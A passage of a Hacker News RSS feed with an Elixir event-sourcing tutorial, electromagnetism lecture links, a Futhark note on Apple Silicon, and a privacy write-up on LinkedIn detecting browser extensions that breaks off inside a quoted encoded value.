contracts don't change, they have addendums, and so on.</p><h2 id="incident-main-goals">Incident Main Goals</h2><p>When I decided to implement a new library, based on my learning through other projects, I had some goals in mind that I'd like to achieve:</p><ul><li>incentivize the usage of Event Sourcing and CQRS as a great choice for domains that can leverage the main benefits of this design pattern;</li><li>offer the essential building blocks for using Event Sourcing in your system with proper contracts, but allowing specific needs to leverage what Elixir already brings to the table, for example, concurrency;</li><li>leverage functions and reducers for executing commands and applying events in the aggregate logic, facilitating stateless tests;</li><li>be extensible without compromising the main principles;</li></ul><h2 id="events-vs-projections">Events vs Projections</h2><p>Events are the <strong>source of truth</strong> in any Event Sourcing domain, they are immutable and they are used to calculate the current state of any aggregate (or entity) at any time. All the events of any type, for any aggregate type, are stored in the Event Store in a single table.</p><p>The projections are the <strong>representation of the current state</strong> of an aggregate and they are very similar to what any system that does not use Event Sourcing has. The domain will have as many projection tables as you need but usually, you will have one table for each entity type. All projection tables are stored in the Projection Store.</p><p>The following diagram helps understand the separation between the command model from the query model, and their responsibilities as well.</p><ol><li>UI/API issues a <strong>Command</strong> to attempt to change the state;</li><li><strong>Aggregate</strong> logic that lives in the <strong>Command Model</strong> is used (including past events) and if everything is fine, a new <strong>Event</strong> will be persisted in the <strong>Event Store</strong>;</li><li>The <strong>Event Handler</strong> will receive the new event and project the new aggregate state into the <strong>Projection Store</strong>;</li><li>UI/API will query the <strong>Aggregate Current State</strong> from the <strong>Query Model</strong>;</li></ol><figure><img src="https://pedroassumpcao.ghost.io/content/images/2020/10/Event-Sourcing.png" alt="Event Sourcing - Command and Query Model" srcset="https://pedroassumpcao.ghost.io/content/images/size/w600/2020/10/Event-Sourcing.png 600w, https://pedroassumpcao.ghost.io/content/images/2020/10/Event-Sourcing.png 710w"></figure><h2 id="aggregate-vs-aggregate-state">Aggregate vs Aggregate State</h2><p>One of the things that I see when implementing Event Sourcing that makes it harder is to try to manage aggregate logic, aggregate state data structure, and aggregate state logic in the same place. Incident does a little differently.</p><p>The <strong>Aggregate</strong> will define how a specific entity (<em>Bank Account</em>, for example) will execute each of its allowed commands and apply each of its allowed events. The aggregate itself only defines the logic but not the current state calculation.</p><p>The <strong>Aggregate State</strong> defines the initial state of an Aggregate and it is able to calculate the current state by replaying all the events through the aggregate logic.</p><p>Back in 2013, Greg Young tweeted the following:</p><!--kg-card-begin: html--><blockquote><div lang="en" dir="ltr"><p>want to learn event sourcing? </p><p>f(state, event) =&gt; state</p></div>— Greg Young (@gregyoung) <a href="https://twitter.com/gregyoung/status/313358540821647360?ref_src=twsrc%5Etfw">March 17, 2013</a></blockquote> <!--kg-card-end: html--><p>Incident follows that principle with the <strong>Aggregate</strong> logic in a nutshell being:</p><ul><li>Command &gt; Function &gt; Event;</li><li>Event and State &gt; Function &gt; New State;</li></ul><p>And part of the <strong>Aggregate State</strong> logic is similar to:</p><!--kg-card-begin: markdown--><pre><code>Enum.reduce(events, state, fn event, state -&gt;
  aggregate.apply(event, state)
end)
</code></pre>
<!--kg-card-end: markdown--><hr><h2 id="let-s-get-started">Let's Get Started</h2><p>In this series we will be using Incident to implement the <strong>Account</strong> domain of a <strong>Bank</strong> system for these main reasons:</p><ul><li>it is a domain that benefits from the Event Sourcing principles;</li><li>it contains simple scenarios such as <strong>opening an account</strong>, <strong>depositing funds</strong>;</li><li>it contains complex scenarios such as <strong>transferring funds</strong> from one account to another;</li></ul><p>Other common domains of a typical Bank system, for example, Client Profile, Authentication/Authorization won't be the focus of the Incident implementation as they are not a good fit, at least not in our case. This is to emphasize the fact that you don't need to have Event Sourcing in your entire system.</p><h3 id="application-and-incident-setup">Application and Incident Setup</h3><p>Let's create a new application for our Bank, including the supervision tree. As a side note, I am using <strong>Elixir 1.11</strong> in this series so some of the Elixir configuration details might vary depending on the version you are using.</p><!--kg-card-begin: markdown--><pre><code>~&gt; mix new bank --sup
</code></pre>
<!--kg-card-end: markdown--><p>Add <strong>Incident</strong> in <code>mix.exs</code>, fetch and compile the dependencies:</p><!--kg-card-begin: markdown--><pre><code>defmodule Bank.MixProject do
  use Mix.Project

  # hidden code
  
  def deps do
    [
      {:incident, "~&gt; 0.5.1"}
    ]
  end
end
</code></pre>
<!--kg-card-end: markdown--><!--kg-card-begin: markdown--><pre><code>~&gt; mix do deps.get, deps.compile
</code></pre>
<!--kg-card-end: markdown--><p>Generate Ecto Repos for the <strong>Event Store</strong> and <strong>Projection Store</strong>, this will create the repo modules:</p><!--kg-card-begin: markdown--><pre><code>~&gt; mix ecto.gen.repo -r Bank.EventStoreRepo
...
~&gt; mix ecto.gen.repo -r Bank.ProjectionStoreRepo
...
</code></pre>
<!--kg-card-end: markdown--><p>In your application <code>config/config.exs</code> specify the Ecto repos and configure Incident:</p><!--kg-card-begin: markdown--><pre><code># hidden code

config :bank, ecto_repos: [Bank.EventStoreRepo, Bank.ProjectionStoreRepo]

config :incident, :event_store,
  adapter: Incident.EventStore.PostgresAdapter,
  options: [
    repo: Bank.EventStoreRepo
  ]

config :incident, :projection_store,
  adapter: Incident.ProjectionStore.PostgresAdapter,
  options: [
    repo: Bank.ProjectionStoreRepo
  ]

import_config "#{config_env()}.exs"
</code></pre>
<!--kg-card-end: markdown--><p>In your application <code>config/dev|test|prod.exs</code> (the example below defines two separated databases but it could be the same one), set up the database access for Ecto for each environment:</p><!--kg-card-begin: markdown--><pre><code># config/dev.exs

# hidden code

config :bank, Bank.EventStoreRepo,
  username: "postgres",
  password: "postgres",
  hostname: "localhost",
  database: "bank_event_store_dev"

config :bank, Bank.ProjectionStoreRepo,
  username: "postgres",
  password: "postgres",
  hostname: "localhost",
  database: "bank_projection_store_dev"
</code></pre>
<!--kg-card-end: markdown--><p>Add the Ecto repo modules to the supervision tree in your <code>lib/bank/application.ex</code>:</p><!--kg-card-begin: markdown--><pre><code>defmodule Bank.Application do
  @moduledoc false

  use Application

  @impl true
  def start(_type, _args) do
    children = [
      Bank.EventStoreRepo,
      Bank.ProjectionStoreRepo
    ]

    opts = [strategy: :one_for_one, name: Bank.Supervisor]
    Supervisor.start_link(children, opts)
  end
end
</code></pre>
<!--kg-card-end: markdown--><p>Create the database(s), generate the Incident <strong>events table</strong> migration, and run the migrations:</p><!--kg-card-begin: markdown--><pre><code>~&gt; mix ecto.create
...
~&gt; mix incident.postgres.init -r Bank.EventStoreRepo
...
~&gt; mix ecto.migrate
...
</code></pre>
<!--kg-card-end: markdown--><p>The setup is done, it seems a lot but most of it is a common setup needed for any application using Ecto.</p><h2 id="the-bank-account">The Bank Account</h2><p>As we will keep track of bank accounts, we will define some initial components that are defined only once, and then later evolve the aggregate with the logic that will be based on the operations we want the aggregate to respond to.</p><h3 id="projection">Projection</h3><p>We will need to present to the user some bank account information. So we will define one projection that will contain the current state of the bank accounts. Generate an Ecto migration as below, please notice the <code>-r</code> flag that specifies which repo the migration will be:</p><!--kg-card-begin: markdown--><pre><code>~&gt; mix ecto.gen.migration CreateBankAccountsTable -r Bank.ProjectionStoreRepo
</code></pre>
<!--kg-card-end: markdown--><p>Populate the migration with the following fields. Besides the desired fields related to bank account data, every projection should also contain <code>version</code>, <code>event_id</code>, and <code>event_date</code> fields. They inform the last event that updated the projection and how many events were applied to it:</p><!--kg-card-begin: markdown--><pre><code>defmodule Bank.ProjectionStoreRepo.Migrations.CreateBankAccountsTable do
  use Ecto.Migration

  def change do
    create table(:bank_accounts) do
      add(:aggregate_id, :string, null: false)
      …</code></pre></div></section></div></main></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://pedroassumpcao.ghost.io/event-sourcing-and-cqrs-using-incident-part-1/">https://pedroassumpcao.ghost.io/event-sourcing-and-cqrs-using-incident-part-1/</a></em></p>]]>
            </description>
            <link>https://pedroassumpcao.ghost.io/event-sourcing-and-cqrs-using-incident-part-1/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25060270</guid>
            <pubDate>Wed, 11 Nov 2020 17:13:35 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Advance Electromagnetism Notes (Site)]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25060248">thread link</a>) | @E-Reverance
<br/>
November 11, 2020 | https://andrealommen.github.io/PHY309/lectures | <a href="https://web.archive.org/web/*/https://andrealommen.github.io/PHY309/lectures">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div aria-label="Content">
      <div>
        <article>

  

  <div>
    <h3 id="for-reference">For reference</h3>
<p><a href="https://andrealommen.github.io/PHY309/lectures/derivatives">All the Fundamental Theorems Together</a><br>
<a href="https://andrealommen.github.io/PHY309/lectures/maxwell">Maxwell’s Equations</a><br>
<a href="https://andrealommen.github.io/PHY309/lectures/minus_signs">Minus Signs</a><br></p>
<h3 id="chapter-1-vector-analysis">Chapter 1: Vector Analysis</h3>
<p><a href="https://andrealommen.github.io/PHY309/lectures/grad">Gradients Theorem</a><br>
<a href="https://andrealommen.github.io/PHY309/lectures/div">Divergence Theorem</a><br>
<a href="https://andrealommen.github.io/PHY309/lectures/curl">Stokes’ Theorem (Curl)</a><br>
<a href="https://andrealommen.github.io/PHY309/lectures/dirac">Dirac Delta Function</a><br>
<a href="https://andrealommen.github.io/PHY309/lectures/potentials">Potentials and Boundary Conditions</a><br></p>
<h3 id="chapter-2-electrostatics">Chapter 2: Electrostatics</h3>
<p><a href="https://andrealommen.github.io/PHY309/lectures/chapt2">Andrea’s Crash Course in Chapter 2</a><br>
<a href="https://andrealommen.github.io/PHY309/lectures/electric">Electric Field</a><br>
<a href="https://andrealommen.github.io/PHY309/lectures/divcurlE">Divergence and Curl of Electric Field, Gauss’s Law</a><br>
<a href="https://andrealommen.github.io/PHY309/lectures/PotentialWorkEnergy">Potential, Work, Energy</a><br>
<a href="https://andrealommen.github.io/PHY309/lectures/conductors">Boundary Conditions and Conductors</a><br></p>
<h3 id="chapter-3-potentials">Chapter 3: Potentials</h3>
<p><a href="https://andrealommen.github.io/PHY309/lectures/chapt3">Andrea’s Crash Course in Chapter 3</a><br>
<a href="https://andrealommen.github.io/PHY309/lectures/laplace">Laplace’s Equation and the Method of Images</a><br>
<a href="https://andrealommen.github.io/PHY309/lectures/separation">Separation of Variables</a><br>
<a href="https://andrealommen.github.io/PHY309/lectures/multipole">Multipole Expansion </a><br></p>
<h3 id="chapter-4-electric-fields-in-matter">Chapter 4: Electric Fields in Matter</h3>
<p><a href="https://andrealommen.github.io/PHY309/lectures/chapt4">Andrea’s Crash Course in Chapter 4</a><br>
<a href="https://andrealommen.github.io/PHY309/lectures/polarization">Polarization</a><br>
<a href="https://andrealommen.github.io/PHY309/lectures/debrief">Debrief HW3</a><br>
<a href="https://andrealommen.github.io/PHY309/lectures/displacement">Displacement</a><br>
<a href="https://andrealommen.github.io/PHY309/lectures/boundaryD">Boundary Values in the Presence of a Dielectric</a><br>
<a href="https://andrealommen.github.io/PHY309/lectures/SolutionToInClassDielectricCylinderProblem.pdf">Full solution to the Dielectric Cylinder Problem</a><br>
<a href="https://andrealommen.github.io/PHY309/lectures/final_words_displacement">Final Words (Rant?) on Displacement</a><br></p>
<h3 id="one-third-of-the-way-through-the-course-we-reflect">One-third of the way through the course, we reflect…</h3>
<p><a href="https://andrealommen.github.io/PHY309/lectures/CumulativeSummary1">Summary of Course so Far</a><br>
<a href="https://andrealommen.github.io/PHY309/lectures/Survey.html">Survey Results</a><br></p>
<h3 id="first-exam">First Exam</h3>
<p><a href="https://andrealommen.github.io/PHY309/lectures/firstexamformat">What will be the format of the 1st exam?</a><br>
<a href="https://andrealommen.github.io/PHY309/lectures/practice_problems_1st">Practice Problems for 1st exam</a><br>
<a href="https://andrealommen.github.io/PHY309/lectures/firstexam">First Exam</a><br></p>
<h3 id="chapter-5-magnetostatics">Chapter 5: Magnetostatics</h3>
<p><a href="https://andrealommen.github.io/PHY309/lectures/chapt5">Andrea’s Crash Course in Chapter 5</a><br>
<a href="https://andrealommen.github.io/PHY309/lectures/lorentz">Lorentz and Biot-Savart</a> <br>
<a href="https://andrealommen.github.io/PHY309/lectures/ampere">Ampere’s Law and the Vector Potential</a><br></p>
<h3 id="chapter-6-magnetic-fields-in-matter">Chapter 6: Magnetic Fields in Matter</h3>
<p><a href="https://andrealommen.github.io/PHY309/lectures/chapt6">Andrea’s Crash Course in Chapter 6</a><br>
<a href="https://andrealommen.github.io/PHY309/lectures/magnetized_matter">Magnetization and the Field of a Magnetized Object</a><br>
<a href="https://andrealommen.github.io/PHY309/lectures/auxiliary">The Auxiliary Field</a><br></p>
<h3 id="chapter-7-electrodynamics">Chapter 7: Electrodynamics</h3>
<p><a href="https://andrealommen.github.io/PHY309/lectures/allChapt7">Andrea’s Crash Course in Chapter 7</a><br>
<a href="https://andrealommen.github.io/PHY309/lectures/induction">Electromotive Force and Induction</a><br>
<a href="https://andrealommen.github.io/PHY309/lectures/maxwellChapt7">Maxwell’s Equations</a><br></p>
<h3 id="chapter-8-griffiths-calls-it-conservation-laws-at-this-point-we-only-picked-up-the-continuity-equation-and-saved-the-rest-for-after-chapter-9">Chapter 8: Griffiths calls it Conservation laws, at this point we only picked up the Continuity Equation and saved the rest for after Chapter 9</h3>
<p>(We’re kind of picking up Chapter 8 along the way…)<br>
<a href="https://andrealommen.github.io/PHY309/lectures/allChapt8">Andrea’s Crash Course in Chapter 8</a><br></p>
<h3 id="chapter-9-electromagnetic-waves">Chapter 9: Electromagnetic Waves</h3>
<p><a href="https://andrealommen.github.io/PHY309/lectures/allChapt9">Andrea’s Crash Course in Chapter 9</a><br>
<a href="https://andrealommen.github.io/PHY309/lectures/light">Light!!!!!</a><br>
<a href="https://andrealommen.github.io/PHY309/lectures/polarization">Polarization of Waves in Linear and Conducting Media</a><br>
<a href="https://andrealommen.github.io/PHY309/lectures/reflection">Boundary Conditions, Reflection and Transmission</a><br></p>
<h3 id="second-exam">Second Exam</h3>
<p><a href="https://andrealommen.github.io/PHY309/lectures/secondexamreview">Review for the second exam</a><br>
<a href="https://andrealommen.github.io/PHY309/lectures/secondexamformat">What will be the format of the 2nd exam?</a><br>
<a href="https://andrealommen.github.io/PHY309/lectures/practice_problems_2nd">Practice Problems for 2nd exam</a><br>
<a href="https://andrealommen.github.io/PHY309/lectures/secondexam">Second Exam</a><br></p>
<h3 id="poynting-vector-energy-transmission-coefficient-parts-of-chapters-8-and-9">Poynting Vector, Energy, Transmission coefficient (parts of chapters 8 and 9)</h3>
<p><a href="https://andrealommen.github.io/PHY309/lectures/quarterwaveplate">In a quarter wave plate, can we really assume the transmission coefficients are the same?</a> <br>
<a href="https://andrealommen.github.io/PHY309/lectures/poynting">Poynting Theorem, Poynting Vector, Energy, Momentum</a> <br>
<a href="https://andrealommen.github.io/PHY309/lectures/transmission">Poynting Theorem in EM Waves, Transmission and Reflection Coefficients</a> <br>
<a href="https://andrealommen.github.io/PHY309/lectures/plasma">Waves in a Tenuous Plasma, Dispersion</a> <br></p>
<h3 id="chapter-10-potentials-and-fields">Chapter 10: Potentials and Fields</h3>
<p><a href="https://andrealommen.github.io/PHY309/lectures/Chapt10ReviewPlusTensors">Andrea’s Crash Course in Chapter 10</a><br>
<a href="https://andrealommen.github.io/PHY309/lectures/potentialformulation">The Potential Formulation</a> <br>
<a href="https://andrealommen.github.io/PHY309/lectures/deferred">The Deferred Potential</a> <br>
<a href="https://andrealommen.github.io/PHY309/lectures/leinard">Leinard-Wiechert Potential</a> <br></p>
<h3 id="chapter-11-radiation">Chapter 11: Radiation</h3>
<p><a href="https://andrealommen.github.io/PHY309/lectures/allChapt11">Andrea’s Crash Course in Chapter 11</a><br>
<a href="https://andrealommen.github.io/PHY309/lectures/radiation">Radiation</a> <br>
<a href="https://andrealommen.github.io/PHY309/lectures/dipole">Dipole Radiation</a> <br>
<a href="https://andrealommen.github.io/PHY309/lectures/point">Radiation from a Point Charge</a> <br></p>
<h3 id="the-final-week-looking-backwards-and-forwards">The Final Week: Looking backwards and forwards</h3>
<p><a href="https://andrealommen.github.io/PHY309/lectures/Chapt10ReviewPlusTensors">Chapter 10 Review (emphasis Gauge and Deferred) Plus Relativity, Chapt 12</a><br>
<a href="https://andrealommen.github.io/PHY309/lectures/Chapt10ReviewPt2">Chapter 10 Review cont’d including Deferred Potential</a> <br>
<a href="https://andrealommen.github.io/PHY309/lectures/allChapt11">Pancake breakfast party, and Review Chapter 11.  We’ll do a questionnaire here to get your thoughts about the class</a></p>
<h3 id="the-final-exam">The Final Exam</h3>
<p>You may look at the following whenever you want.  It explains the format of the exam and what kind of problems
to expect.
<a href="https://andrealommen.github.io/PHY309/lectures/finalexamformat">Format of the Final Exam</a><br></p>

<p>When you’re ready to take the exam please click <a href="https://andrealommen.github.io/PHY309/lectures/finalexam">here.</a></p>

  </div>


</article>


      </div>
    </div></div>]]>
            </description>
            <link>https://andrealommen.github.io/PHY309/lectures</link>
            <guid isPermaLink="false">hacker-news-small-sites-25060248</guid>
            <pubDate>Wed, 11 Nov 2020 17:11:22 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Will Futhark Work on Apple Silicon?]]>
            </title>
            <description>
<![CDATA[
Score 6 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25060172">thread link</a>) | @Athas
<br/>
November 11, 2020 | https://futhark-lang.org/blog/2020-11-11-will-futhark-work-on-apple-silicon.html | <a href="https://web.archive.org/web/*/https://futhark-lang.org/blog/2020-11-11-will-futhark-work-on-apple-silicon.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="content">
      

<p>
    Posted on November 11, 2020
    
        by Troels Henriksen
    
</p>

<p>Apple is coming out with computers that are basically ARM64, <a href="https://en.wikipedia.org/wiki/Think_different">but with a different ABI than existing ARM64 for some reason</a>. They call the architecture <a href="https://en.wikipedia.org/wiki/Mac_transition_to_Apple_Silicon">Apple Silicon</a>, which is a wonderful term that will undoubtedly never become dated or insufficiently precise.</p>
<p>Anyway, you see various posts such <a href="https://developer.r-project.org/Blog/public/2020/11/02/will-r-work-on-apple-silicon/">Will R Work on Apple Silicon?</a> where language developers answer whether their language will work on these new machines. Since these machines will support transparent emulation of x86, the simple answer is <em>yes</em>. Apple’s emulation was quite good during the PPC-to-x86 transition, so this is trustworthy. Of course, emulation is never going to be as fast as native compilation. For R, the problem is that they depend on some Fortran code, and there is <a href="https://developer.apple.com/forums/thread/651476">not yet a Fortran compiler available for Apple Silicon</a>.</p>
<p>Well, I can confirm that Futhark depends on absolutely no Fortran. Futhark compiles to C (or Python), and does not care about the specific target architecture. Therefore, Futhark programs should run fine on Apple Silicon. The bigger problem is that <a href="https://www.extremetech.com/computing/270902-apple-defends-killing-opengl-opencl-as-developers-threaten-revolt">Apple has deprecated OpenCL</a>, and <a href="https://www.provideocoalition.com/officially-official-nvidia-drops-cuda-support-for-macos/">does not support CUDA at all</a> due to being grumpy with NVIDIA, so there may eventually be no way to run Futhark <em>on a GPU</em> on macOS. It is unlikely that we will find the time to add a backend for Apple’s <a href="https://developer.apple.com/metal/">proprietary Metal API</a> that is supported <em>absolutely nowhere else</em>, but it’s possible that we’ll finish Futhark’s embryonic Vulkan backend. While macOS does not come bundled with Vulkan, <a href="https://github.com/KhronosGroup/MoltenVK">even Apple probably cannot hold back this eruption</a>.</p>
<p>And of course, the Futhark multi-core backend should run well on any Unix-like system.</p>


    </div></div>]]>
            </description>
            <link>https://futhark-lang.org/blog/2020-11-11-will-futhark-work-on-apple-silicon.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-25060172</guid>
            <pubDate>Wed, 11 Nov 2020 17:04:03 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Show HN: Minimal 3D creative coding tool – control 8×8×8 dots with JavaScript]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 1 (<a href="https://news.ycombinator.com/item?id=25060146">thread link</a>) | @doersino
<br/>
November 11, 2020 | https://doersino.github.io/tixyz/ | <a href="https://web.archive.org/web/*/https://doersino.github.io/tixyz/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to extract article]]>
            </description>
            <link>https://doersino.github.io/tixyz/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25060146</guid>
            <pubDate>Wed, 11 Nov 2020 17:02:25 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[A look at how LinkedIn exfiltrates extension data from their users (2020)]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25060089">thread link</a>) | @coreyprophitt
<br/>
November 11, 2020 | https://prophitt.me/a-look-at-how-linkedin-exfiltrates-extension-data-from-their-users | <a href="https://web.archive.org/web/*/https://prophitt.me/a-look-at-how-linkedin-exfiltrates-extension-data-from-their-users">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article>
        <div>
          <p><img src="https://prophitt.me/assets/images/posts/linkedins-gambit.svg" width="300" height="300"></p><div>
            
            <p><time datetime="2020/11/05T00:00:00Z">Published on November 5th, 2020</time>
          </p></div>
        </div>

        <p><span>Â·</span><span>Â·</span><span>Â·</span></p>

        <h2>What did I find?</h2>
        <p>
          LinkedIn is actively spraying their users' browser with web requests and dom queries in an attempt to determine
          if certain browser extensions are installed. The data is then exfiltrated back to LinkedIn.
        </p>
        <p>
          It is not clear what the data is used for or how it is used by LinkedIn. However, it is clear LinkedIn is
          targeting certain sales and recruiting tools. It is also common knowledge in the sales and recruiting
          communities that LinkedIn restricts or outright bans accounts based on the use of unapproved tools.
        </p>
        <p>
          LinkedIn is within their right to detect malicious user behavior and take action. However, the means they are
          employing are problematic for a number of reasons:
          </p><ol>
            <li>
              LinkedIn doesn't verify you are actually using the extension, they only check if the extension is currently
              installed and/or enabled.
            </li>
            <li>
              A number of the tools LinkedIn does not allow have legitimate uses and can be used on public web pages.
            </li>
            <li>
              The exfiltrated data could be further used for nefarious things such as browser finger printing.
            </li>
          </ol>
        

        <p>
          Furthermore, the methods employed by LinkedIn to detect extensions take advantage of developer oversights and
          browser extension limitations. This comes across as shady to me.
        </p>

        <h2>Unraveling the Mystery</h2>
        <p>
          I was initially turned on to LinkedIn's data exfiltration when I noticed a large number of failed web requests while visiting
          a LinkedIn profile. Initially, I thought my adblocker was blocking network requests. However, upon a closer look I noticed the
          web requests were not being sent across the web. They were actually being sent locally, to the browser itself. This can be
          seen clearly when viewing the network request's path. The paths were all being made using Chrome's own extension protocol. All
          requests began with <strong>chrome-extension://</strong>.
        </p>
        <p>
          For the uninitiated, the Chrome extension protocol is used to make web requests directly to an installed browser extension.
          Typically, this is used by the extension itself to retrieve resources or assets. However, any resources listed in an extension's
          manifest under the <strong>"web_accessible_resources"</strong> key are available to all web page contexts. Ironically, this
          section of the manifest was designed to minimize browser fingerprinting and protect the privacy of the extension user. Here's
          an excerpt directly from <a target="_blank" rel="noopener noreferrer" href="https://developer.chrome.com/extensions/manifest/web_accessible_resources">
          Google's own documentation</a> regarding the web accessible resources:
        </p>

        <blockquote>
         Prior to manifest version 2 all resources within an extension could be accessed from any page on the web. This allowed a malicious website to fingerprint the extensions that a user has installed or exploit vulnerabilities (for example XSS bugs) within installed extensions. Limiting availability to only resources which are explicitly intended to be web accessible serves to both minimize the available attack surface and protect the privacy of users.
        </blockquote>

        <p>
         Unfortunately, Google's changes only minimized the attack surface and did not prevent browser fingerprinting or privacy violations.
         It is this very issue that is leveraged by LinkedIn to identify installed extensions.
        </p>

        <p>
          My curiosity got the best of me and I set out to learn more about how LinkedIn was performing the scan and what they were doing
          with the data.
        </p>

        <h2>Eeny, Meeny, Miny, Moe</h2>
        <p>
          The sheer number of Chrome extension web requests performed by LinkedIn were staggering. I began to wonder how they were storing
          all of the extension information in order to make those web requests. The hunt began.
        </p>
        <p>
          Initially, I jotted down a few of the unique extension ids in hopes of finding references to them. I looked for any reference
          to the ids within LinkedIn's web responses but I had no luck. I looked within LinkedIn's web resources and code, but again I had no
          luck. Another idea crossed my mind; <i>Maybe they were hiding the extension information in their cookies or local storage?</i>
        </p>
        <p>
          My hunch led me to LinkedIn's local storage and a curious key, <strong>C_C_M</strong>. The value for the key was a large,
          seemingly random set of characters seen below:
        </p><pre><code>eyJcdTAwNDNcdTAwNmZcdTAwNmVcdTAwNjZcdTAwNjlcdTAwNjciOnsiXHUwMDYxXHUwMDc1XHUwMDc0XHUwMDZmXHUwMDU1XHUwMDcwXHUwMDY0XHUwMDYxXHUwMDc0XHUwMDY1Ijp0cnVlLCJcdTAwNjFcdTAwNzVcdTAwNzRcdTAwNmZcdTAwNDVcdTAwNzhcdTAwNjVcdTAwNjNcdTAwNzVcdTAwNzRcdTAwNjUiOnRydWUsIlx1MDA2NVx1MDA3OFx1MDA2NVx1MDA2M1x1MDA3NVx1MDA3NFx1MDA2NVx1MDA0OVx1MDA2ZVx1MDA3NFx1MDA2NVx1MDA3Mlx1MDA3Nlx1MDA2MVx1MDA2YyI6MTgwMDAwMCwiXHUwMDY1XHUwMDZlXHUwMDYxXHUwMDYyXHUwMDZjXHUwMDY1Ijp0cnVlLCJcdTAwNjVcdTAwNzhcdTAwNjVcdTAwNjNcdTAwNzVcdTAwNzRcdTAwNjUiOmZhbHNlLCJcdTAwNjRcdTAwNmZcdTAwNmRcdTAwNTNcdTAwNjNcdTAwNjFcdTAwNmUiOnRydWUsIlx1MDA2NFx1MDA2Zlx1MDA2ZFx1MDA1M1x1MDA2M1x1MDA2MVx1MDA2ZVx1MDA1NFx1MDA2OVx1MDA2ZFx1MDA2NVx1MDA2Zlx1MDA3NVx1MDA3NCI6MTAwLCJcdTAwNzBcdTAwNjFcdTAwNzRcdTAwNjhcdTAwNTNcdTAwNjNcdTAwNjFcdTAwNmUiOnRydWUsIlx1MDA3MFx1MDA2MVx1MDA3NFx1MDA2OFx1MDA1M1x1MDA2M1x1MDA2MVx1MDA2ZVx1MDA1NFx1MDA2OVx1MDA2ZFx1MDA2NVx1MDA2Zlx1MDA3NVx1MDA3NCI6MTAwLCJcdTAwNjlcdTAwNmVcdTAwNjlcdTAwNzQiOjIyMjAwMDB9LCJcdTAwNGRcdTAwNjVcdTAwNzRcdTAwNjFcdTAwNjRcdTAwNjFcdTAwNzRcdTAwNjEiOnsiXHUwMDY1XHUwMDc4XHUwMDc0IjpbeyJcdTAwNmVcdTAwNjFcdTAwNmRcdTAwNjUiOiJcdTAwNmFcdTAwNGZcdTAwNjRcdTAwNjZcdTAwNDNcdTAwNjFcdTAwNTdcdTAwNDhcdTAwNzkiLCJcdTAwNjlcdTAwNmVcdTAwNzRcdTAwNjVcdTAwNzJcdTAwNzZcdTAwNjFcdTAwNmMiOjM2MDAwMDAsIlx1MDA2NFx1MDA2MVx1MDA3NFx1MDA2NSI6MCwiXHUwMDc0XHUwMDZmXHUwMDcwXHUwMDUwXHUwMDYxXHUwMDc0XHUwMDY4IjpbIlx1MDA3MFx1MDA3Mlx1MDA2Zlx1MDA2Nlx1MDA2OVx1MDA2Y1x1MDA2NSIsIlx1MDA3Mlx1MDA2NVx1MDA2M1x1MDA3Mlx1MDA3NVx1MDA2OVx1MDA3NFx1MDA2NVx1MDA3MiJdLCJcdTAwNjRcdTAwNmZcdTAwNmQiOnsiXHUwMDczXHUwMDY1XHUwMDZjXHUwMDY1XHUwMDYzXHUwMDc0XHUwMDZmXHUwMDcyIjpbIlx1MDAyZVx1MDA3M1x1MDA2MVx1MDA2Y1x1MDA2NVx1MDA3M1x1MDA2Y1x1MDA2Zlx1MDA2Nlx1MDA3NFx1MDAyZFx1MDA2Y1x1MDA2Zlx1MDA2N1x1MDA2ZiJdfSwiXHUwMDcwXHUwMDYxXHUwMDc0XHUwMDY4IjpbXX0seyJcdTAwNmVcdTAwNjFcdTAwNmRcdTAwNjUiOiJcdTAwNmFcdTAwNGZcdTAwNjRcdTAwNjZcdTAwNDNcdTAwNjFcdTAwNTdcdTAwNDhcdTAwNzlcdTAwNDlcdTAwNGZcdTAwNzZcdTAwNjZcdTAwNThcdTAwNDdcdTAwNjYiLCJcdTAwNjlcdTAwNmVcdTAwNzRcdTAwNjVcdTAwNzJcdTAwNzZcdTAwNjFcdTAwNmMiOjg2NDAwMDAwLCJcdTAwNjRcdTAwNjFcdTAwNzRcdTAwNjUiOjAsIlx1MDA3NFx1MDA2Zlx1MDA3MFx1MDA1MFx1MDA2MVx1MDA3NFx1MDA2OCI6WyJcdTAwNzBcdTAwNzJcdTAwNmZcdTAwNjZcdTAwNjlcdTAwNmNcdTAwNjUiLCJcdTAwNzJcdTAwNjVcdTAwNjNcdTAwNzJcdTAwNzVcdTAwNjlcdTAwNzRcdTAwNjVcdTAwNzIiXSwiXHUwMDY0XHUwMDZmXHUwMDZkIjp7Ilx1MDA3M1x1MDA2NVx1MDA2Y1x1MDA2NVx1MDA2M1x1MDA3NFx1MDA2Zlx1MDA3MiI6W119LCJcdTAwNzBcdTAwNjFcdTAwNzRcdTAwNjgiOlsiXHUwMDYzXHUwMDY2XHUwMDY2XHUwMDY3XHUwMDZhXHUwMDY3XHUwMDY5XHUwMDY3XHUwMDZhXHUwMDY2XHUwMDY3XHUwMDZhXHUwMDZiXHUwMDY2XHUwMDY0XHUwMDZmXHUwMDcwXHUwMDYyXHUwMDZmXHUwMDYyXHUwMDYyXHUwMDY0XHUwMDYxXHUwMDY0XHUwMDYxXHUwMDY1XHUwMDZjXHUwMDYyXHUwMDY4XHUwMDY1XHUwMDcwXHUwMDZmXHUwMDJmXHUwMDY5XHUwMDZkXHUwMDYxXHUwMDY3XHUwMDY1XHUwMDczXHUwMDJmXHUwMDY5XHUwMDYzXHUwMDZmXHUwMDZlXHUwMDJlMTI4XHUwMDJlXHUwMDcwXHUwMDZlXHUwMDY3Il19LHsiXHUwMDZlXHUwMDY